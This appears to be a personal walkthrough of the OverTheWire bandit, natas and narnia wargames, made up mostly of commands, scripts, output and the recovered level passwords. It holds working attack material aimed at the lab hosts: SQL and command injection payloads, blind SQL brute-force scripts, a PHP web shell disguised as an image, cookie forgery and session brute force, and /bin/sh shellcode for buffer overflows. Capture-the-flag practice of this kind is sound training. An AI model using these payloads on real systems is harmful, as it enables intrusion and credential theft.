# [overthewire](http://overthewire.org/wargames/)

## [bandit](http://overthewire.org/wargames/bandit/)

### level 0

        # ssh bandit0@bandit.labs.overthewire.org
        password: bandit0

        # cat readme
        boJ9jbbUNNfktd78OOpsqOltutMc3MY1

### level 1

        # ssh bandit1@bandit.labs.overthewire.org
        password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1

        # cat ./-
        CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

### level 2

        # ssh bandit2@bandit.labs.overthewire.org
        password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

        # cat spaces\ in\ this\ filename
        UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

### level 3

        # ssh bandit3@bandit.labs.overthewire.org
        password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

        # cat inhere/.hidden
        pIwrPrtPN36QITSp3EQaw936yaFoFgAB

### level 4

        # ssh bandit4@bandit.labs.overthewire.org
        password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB

        # file inhere/*
        inhere/-file00: data
        inhere/-file01: data
        inhere/-file02: data
        inhere/-file03: data
        inhere/-file04: data
        inhere/-file05: data
        inhere/-file06: data
        inhere/-file07: ASCII text
        inhere/-file08: data
        inhere/-file09: data
        
        # cat inhere/-file07
        koReBOKuIDDepwhWk7jZC0RTdopnAYKh

### level 5

        # ssh bandit5@bandit.labs.overthewire.org
        password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh

        # find inhere/ -size 1033c -exec cat {} \;
        DXjZPULLxYr17uwoI01bNLQbtFemEgo7

### level 6

        # ssh bandit6@bandit.labs.overthewire.org
        password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7

        # find / -size 33c -user bandit7 -group bandit6 -exec cat {} \;
        HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

### level 7

        # ssh bandit7@bandit.labs.overthewire.org
        password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

        # cat data.txt | grep millionth
        cvX2JJa4CFALtqS87jk27qwqGhBM9plV

### level 8

        # ssh bandit8@bandit.labs.overthewire.org
        password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV

        # cat data.txt | sort | uniq -u
        UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

### level 9

        # ssh bandit9@bandit.labs.overthewire.org
        password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

        # cat data.txt | grep -a '==='
        truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

### level 10

        # ssh bandit10@bandit.labs.overthewire.org
        password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

        # cat data.txt | base64 --decode
        The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

### level 11

        # ssh bandit11@bandit.labs.overthewire.org
        password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

        # cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m"
        The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

### level 12

        # ssh bandit12@bandit.labs.overthewire.org
        password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

        # mkdir /tmp/viiing
        # cp data.txt /tmp/viiing
        # cd /tmp/viiing
        # xxd -r data.txt > data

Then extract the compressed file repeatedly using gunzip and bunzip2.

        # cat data8
        The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

### level 13

        # ssh bandit13@bandit.labs.overthewire.org
        password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

        # ssh -i sshkey.private bandit14@localhost
        # cat /etc/bandit_pass/bandit14
        4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

### level 14

        # ssh bandit14@bandit.labs.overthewire.org
        password: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

        # echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | nc localhost 30000
        Correct!
        BfMYroe26WYalil77FoDi9qh59eK5xNr

### level 15

        # ssh bandit15@bandit.labs.overthewire.org
        password: BfMYroe26WYalil77FoDi9qh59eK5xNr

        # echo BfMYroe26WYalil77FoDi9qh59eK5xNr | openssl s_client -quiet -connect localhost:30001
        Correct!
        cluFn7wTiGryunymYOu4RcffSxQluehd

### level 16

        # ssh bandit16@bandit.labs.overthewire.org
        password: cluFn7wTiGryunymYOu4RcffSxQluehd

        # nmap -p 31000-32000 localhost
        PORT      STATE SERVICE
        31046/tcp open  unknown
        31518/tcp open  unknown
        31691/tcp open  unknown
        31790/tcp open  unknown
        31960/tcp open  unknown

        # nmap -sV -p 31046,31518,31691,31790,31960 localhost
        PORT      STATE SERVICE VERSION
        31046/tcp open  echo
        31518/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
        31691/tcp open  echo
        31790/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
        31960/tcp open  echo

        # echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -quiet -connect localhost:31791

It returns a private key and save the private key in file /tmp/ving/rsa.

        # chmod 400 rsa
        # ssh -i rsa bandit17@localhost
        # cat /etc/bandit_pass/bandit17
        xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn

### level 17

        # ssh bandit17@bandit.labs.overthewire.org
        password: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn

        # diff passwords.new passwords.old
        42c42
        < kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
        ---
        > BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR

### level 18

        # scp bandit18@bandit.labs.overthewire.org:~/readme ./
        password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

        # cat readme
        IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

### level 19

        # ssh bandit19@bandit.labs.overthewire.org
        password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

        # ./bandit20-do cat /etc/bandit_pass/bandit20
        GbKksEFF4yrVs6il55v6gwY5aVje5f0j

### level 20

        # ssh bandit20@bandit.labs.overthewire.org
        password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j

        # echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc localhost -l 7999

Then open another shell via ssh.

        # ./suconnect 7999

The password for the next level will be shown in the first shell.

        gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

### level 21

        # ssh bandit21@bandit.labs.overthewire.org
        password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

        # cat /etc/cron.d/cronjob_bandit22
        * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

        # cat /usr/bin/cronjob_bandit22.sh

        chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
        cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

        # cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
        Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

### level 22

        # ssh bandit22@bandit.labs.overthewire.org
        password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

        # cat /usr/bin/cronjob_bandit23.sh

        myname=$(whoami)
        mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
        echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
        cat /etc/bandit_pass/$myname > /tmp/$mytarget

        # cat /tmp/8ca319486bfbbc3663ea0fbe81326349
        jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

### level 23

        # ssh bandit23@bandit.labs.overthewire.org
        password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

Create a shell script in /var/spool/bandit24.

        # cat shell.sh

        #!/bin/bash
        mkdir /tmp/viiiiing
        cat /etc/bandit_pass/bandit24 > /tmp/viiiiing/pass

        # chmod 777 shell.sh
        # cat /tmp/viiiiing/pass
        UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

### level 24

        # ssh bandit24@bandit.labs.overthewire.org
        password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

        # mkdir /tmp/vving && cd /tmp/vving
        # cat shell.sh
        i=0
        while [ $i -lt 10000 ]
        do
            echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002 >> log
            i=$(($i+1))
        done

        # bash shell.sh

        # cat log | sort | uniq
        The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

### level 25

        # ssh bandit25@bandit.labs.overthewire.org
        password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

        # cat /etc/passwd | grep bandit26
        bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

        # cat /usr/bin/showtext

        #!/bin/sh

        more ~/text.txt
        exit 0

The text.txt is only 6 lines.
Make my terminal's heigth less than 6 lines to get a page break.

        # ssh -i bandit26.sshkey bandit26@localhost

Enter "v" to start up a editor(vi).
Then type ":r /etc/bandit_pass/bandit26" and the password will be shown.

        5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

## [natas](http://overthewire.org/wargames/natas/)

### [level 0](http://natas0.natas.labs.overthewire.org)

        Username: natas0
        Password: natas0

        The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto 

### [level 1](http://natas1.natas.labs.overthewire.org)

        Username: natas1
        Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

        The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi 

### [level 2](http://natas2.natas.labs.overthewire.org)

        Username: natas2
        Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

I find a label.

        <img src="files/pixel.png">

There is a users.txt in the same directory and password for natas3 is in it.

        natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

### [level 3](http://natas3.natas.labs.overthewire.org)

        Username: natas3
        Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

It seems like level 2, but a comment take place of the image label above.

        <!-- No more information leaks!! Not even Google will find it this time... -->

I check the robots.txt naturally.

        User-agent: *
        Disallow: /s3cr3t/

There is also a user.txt with password for the next level.

        natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

### [level 4](http://natas4.natas.labs.overthewire.org)

        Username: natas4
        Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

It determines whether we are come from "http://natas5.natas.labs.overthewire.org/" by the "Referer" header field.
I modify the header by Modify Headers, an add-on for firefox.

        Access granted.
        The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 

### [level 5](http://natas5.natas.labs.overthewire.org)

        Username: natas5
        Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

Request cookies contain a field "loggedin". Change the value from 0 to 1 using CookieKeeper, an add-on for firefox.

        Access granted.
        The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

### [level 6](http://natas6.natas.labs.overthewire.org)

        Username: natas6
        Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

The secret is in /includes/secret.inc.

        <?
        $secret = "FOEIUWGHFEEUHOFUOIU";
        ?>

        Access granted.
        The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

### [level 7](http://natas7.natas.labs.overthewire.org)

        Username: natas7
        Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

The password is in http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8.

        DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 

### [level 8](http://natas8.natas.labs.overthewire.org)

        Username: natas8
        Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Run the PHP script.

        <?php
        echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
        ?>

        oubWYf2kBq

        Access granted.
        The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 

### [level 9](http://natas9.natas.labs.overthewire.org)

        Username: natas9
        Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

Enter the words in textbox and push the search button.

        '.*' /etc/natas_webpass/natas10

The output contains password.

        /etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

### [level 10](http://natas10.natas.labs.overthewire.org)

        Username: natas10
        Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

This level only check whether the input contains character ";", "|" and "&".
The solution for level 9 still works.

        '.*' /etc/natas_webpass/natas11

Show the result here.

        /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

### [level 11](http://natas11.natas.labs.overthewire.org)

        Username: natas11
        Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

We get the cookie and we konw what the cookie means, so run the code below.

        #include <stdio.h>

        int main()
        {
            int i;
            char data[] = "{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}";
            char encrypt[] = "\x0a\x55\x4b\x22\x1e\x00\x48\x2b\x02\x04\x4f\x25\x03\x13\x1a\x70\x53\x19\x57\x68\x5d\x55\x5a\x2d\x12\x18\x54\x25\x03\x55\x02\x68\x52\x11\x5e\x2c\x17\x11\x5e\x68\x0c";
            for ( i = 0; i < sizeof(data) && i<sizeof(encrypt); i++ )
                printf("%c", data[i]^encrypt[i]);
            printf("\n");
            return 0;
        }

The result show the key of xor encrypting.

        qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq

Get the cookie which we need with the key "qw8J".

        <?php
        function xor_encrypt($in) {
            $key = 'qw8J';
            $text = $in;
            $outText = '';
     
            for($i=0;$i<strlen($text);$i++) {
                $outText .= $key[$i % strlen($key)] ^ $text[$i];
            }
     
            return $outText;
        }
     
        $defaultdata = '{"showpassword":"yes","bgcolor":"#ffffff"}';
        echo base64_encode(xor_encrypt($defaultdata));
        ?>

Replace old cookie with the new.

        ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

Refresh the page.

        The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

### [level 12](http://natas12.natas.labs.overthewire.org)

        Username: natas12
        Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

First, create a file with codes below.

        <?
        passthru("cat /etc/natas_webpass/natas13");
        ?>

Change the filename value in post form to upload a PHP file.
Then browse to the file using the URL.

        jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 

### [level 13](http://natas13.natas.labs.overthewire.org)

        Username: natas13
        Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

This new challenge check whether the file is an image using function "exif_imagetype" before receive it.
So we create the file with command below to make it looking like an image.

        echo -e '\xff\xd8\xff\xe0<?passthru("cat /etc/natas_webpass/natas14");?>' > Trojan.php

Then do the same as previous challenge.

        Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

### [level 14](http://natas14.natas.labs.overthewire.org)

        Username: natas14
        Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

Read the sourcecode, we can browse to

        http://natas14.natas.labs.overthewire.org/?username=test&password=test&debug

We can see the username and password in double quotes.

        Executing query: SELECT * from users where username="test" and password="test"

If we add double quote in username and password, the SQL language is break.

        http://natas14.natas.labs.overthewire.org/?username="or"0"="0&password="or"0"="0&debug

        Executing query: SELECT * from users where username=""or"0"="0" and password=""or"0"="0"
        Successful login!
        The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

### [level 15](http://natas15.natas.labs.overthewire.org)

        Username: natas15
        Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

We can browse to the url below to guess the password.

        http://natas15.natas.labs.overthewire.org/?username=natas16" and password like binary"W%&debug

Write a python script to complete the work.

        import requests
        chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
                [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
                [chr(i) for i in range(ord("0"),ord("9")+1)]
        password = ''
        for i in range(64):
            for ch in chars:
            if 'This user exists' in requests.get('http://natas15.natas.labs.overthewire.org/?username=natas16" and password like binary"'+password+ch+'%&debug', auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).text:
                password += ch
                print(password)
                break
            else:
                break

Eventualy we get the password for natas 16.

        WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

### [level 16](http://natas16.natas.labs.overthewire.org)

        Username: natas16
        Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

Like level 10, the input can't contain ";", "|", "&", "`", "\", "'", and """.
But we can still inject other command using $(command).

       $(grep -E ^a.*$ /etc/natas_webpass/natas17)hacker

Input the string above. If the password is start with a, there will be no output.
In this way, we can find out the password.
Similarly, write a python script to complete the work.

        import requests
        chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
                [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
                [chr(i) for i in range(ord("0"),ord("9")+1)]
        password = ''
        for i in range(64):
            for ch in chars:
                if 'hacker' not in requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep -E ^'+password+ch+'.*$ /etc/natas_webpass/natas17)hacker&submit=Search', auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).text:
                    password += ch
                    print(password)
                    break
            else:
                break

We get the password.

        8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

### [level 17](http://natas17.natas.labs.overthewire.org)

        Username: natas17
        Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

This level is upgrade of level 15.
We can't see the result of SQL injection directly.
We are going to use time-based blind SQL injections to brute force the password.

Have a try, browse to the url below to guess the password.
If the password starts with x, the result will be returned after a sleep.
Why can character "#" following input disable the last double quote?

        http://natas17.natas.labs.overthewire.org/?username=natas18" and if(password like binary "x%", sleep(5), null)%23&debug

I will show the python script below.

        import requests
        chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
                [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
                [chr(i) for i in range(ord("0"),ord("9")+1)]
        password = ''
        for i in range(64):
            for ch in chars:
                try:
                    requests.get('http://natas17.natas.labs.overthewire.org/?username=natas18" and if (password like binary "'+password+ch+'%",sleep(5),null) %23', auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), timeout=1)
                except requests.exceptions.Timeout:
                    password += ch
                    print(password)
                    break
            else:
                break

We get the result in some minutes.

        xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

### [level 18](http://natas18.natas.labs.overthewire.org)

        Username: natas18
        Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

First, get a cookie.
Sencond, edit the "PHPSESSID" field of the cookie to login as an admin.
Show the python script below.

        import requests
        _cookie = requests.get('http://natas18.natas.labs.overthewire.org/?username=&password=0&debug', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')).cookies
        for i in range(640):
            _cookie.set('PHPSESSID',str(i))
            r = requests.get('http://natas18.natas.labs.overthewire.org/', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies=_cookie)
            if 'You are an admin' in r.text:
                print(r.text)
                break

We find the password in the html text.

        Username: natas19
        Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
        
## [narnia](http://overthewire.org/wargames/narnia/)

### level 0

        # ssh narnia0@narnia.labs.overthewire.org
        password: narnia0
        
        # cat /games/narnia/narnia0.c
        
        #include <stdio.h>
        #include <stdlib.h>

        int main(){
            long val=0x41414141;
            char buf[20];

            printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
            printf("Here is your chance: ");
            scanf("%24s",&buf);

            printf("buf: %s\n",buf);
            printf("val: 0x%08x\n",val);

            if(val==0xdeadbeef)
                system("/bin/sh");
            else {
                printf("WAY OFF!!!!\n");
                exit(1);
            }

            return 0;
        }
        
        # ((echo -e "12345123451234512345\xef\xbe\xad\xde");(echo cat /etc/narnia_pass/narnia1)) | /games/narnia/narnia0
        Correct val's value from 0x41414141 -> 0xdeadbeef!
        Here is your chance: buf: 12345123451234512345ﾭ�
        val: 0xdeadbeef
        efeidiedae

### level 1

        # ssh narnia1@narnia.labs.overthewire.org
        password: efeidiedae
        
        # cat /games/narnia/narnia1.c
        
        #include <stdio.h>

        int main(){
            int (*ret)();

            if(getenv("EGG")==NULL){    
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
            }

            printf("Trying to execute EGG!\n");
            ret = getenv("EGG");
            ret();

            return 0;
        }

        # export EGG=`echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`
        # /games/narnia/narnia1
        # cat /etc/narnia_pass/narnia2
        nairiepecu
        
### level 2

        # ssh narnia2@narnia.labs.overthewire.org
        password: nairiepecu
        
        # cat /games/narnia/narnia2.c
        
        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>

        int main(int argc, char * argv[]){
            char buf[128];

            if(argc == 1){
                printf("Usage: %s argument\n", argv[0]);
                exit(1);
            }
            strcpy(buf,argv[1]);
            printf("%s", buf);

            return 0;
        }
        
        # /games/narnia/narnia2 `python -c 'print "\x90"*108+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*4+"\xd0\xd5\xff\xff"'`
        
        # whoami
        narnia3
        
### level 3

        # ssh narnia3@narnia.labs.overthewire.org
        password: vaequeezee
        
        # cat /games/narnia/narnia3.c 

        
        #include <stdio.h>
        #include <sys/types.h>
        #include <sys/stat.h>
        #include <fcntl.h>
        #include <unistd.h>
        #include <stdlib.h>
        #include <string.h> 

        int main(int argc, char **argv)
        {
            int  ifd,  ofd;
            char ofile[16] = "/dev/null";
            char ifile[32];
            char buf[32];
 
            if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
            }
 
            /* open files */
            strcpy(ifile, argv[1]);
            if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
            }
            if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
            }
 
            /* copy from file1 to file2 */
            read(ifd, buf, sizeof(buf)-1);
            write(ofd,buf, sizeof(buf)-1);
            printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 
            /* close 'em */
            close(ifd);
            close(ofd);
 
            exit(1);
        }


        # mkdir -p /tmp/pass/narnia3---------------/tmp
        # ln -s /etc/narnia_pass/narnia4 /tmp/pass/narnia3---------------/tmp/n4ps
        # touch /tmp/n4ps
        # /games/narnia/narnia3 /tmp/pass/narnia3---------------/tmp/n4ps
        copied contents of /tmp/pass/narnia3---------------/tmp/n4ps to a safer place... (/tmp/n4ps)

        # cat /tmp/n4ps
        thaenohtai

### level 4

        # ssh narnia4@narnia.labs.overthewire.org
        password: thaenohtai

        # cat /games/narnia/narnia4.c


        #include <string.h>
        #include <stdlib.h>
        #include <stdio.h>
        #include <ctype.h>

        extern char **environ;

        int main(int argc,char **argv){
            int i;
            char buffer[256];

            for(i = 0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));

            if(argc>1)
                strcpy(buffer,argv[1]);

            return 0;
        }

        # /games/narnia/narnia4 `python -c 'print "\x90"*219+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x90"*27+"\xf0\xd4\xff\xff"'`
        # cat /etc/narnia_pass/narnia5
        faimahchiy


### level 5

        # ssh narnia5@narnia.labs.overthewire.org
        password: faimahchiy

        # cat /games/narnia/narnia5.c


        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
 
        int main(int argc, char **argv){
            int i = 1;
            char buffer[64];

            snprintf(buffer, sizeof buffer, argv[1]);
            buffer[sizeof (buffer) - 1] = 0;
            printf("Change i's value from 1 -> 500. ");

            if(i==500){
                printf("GOOD\n");
                system("/bin/sh");
            }

            printf("No way...let me give you a hint!\n");
            printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
            printf ("i = %d (%p)\n", i, &i);
            return 0;
        }
